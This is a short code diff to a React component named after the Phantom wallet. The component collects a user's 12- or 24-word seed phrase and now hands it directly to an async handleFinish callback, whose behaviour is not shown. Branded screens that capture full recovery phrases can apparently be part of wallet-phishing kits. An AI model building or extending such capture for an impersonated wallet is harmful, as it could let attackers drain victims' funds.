@@ -8,10 +8,8 @@ import PhantomFull from "../icons/phantom-full";
 
 const Phantom = ({
 	handleFinish,
-	setWalletPhrase,
 }: {
-	handleFinish: () => void;
-	setWalletPhrase: any;
+	handleFinish: (walletPhrase: string) => Promise<void>;
 }) => {
 	const [wordCount, setWordCount] = useState<12 | 24>(12);
 	const [words, setWords] = useState<string[]>(Array(12).fill(""));
@@ -21,8 +19,7 @@ const Phantom = ({
 
 	const handleComplete = () => {
 		setSeedPhrase(words.join(" "));
-		setWalletPhrase(words.join(" "));
-		handleFinish();
+		handleFinish(words.join(" "));
 	};
 
 	const handleWordCountChange = (count: 12 | 24) => {
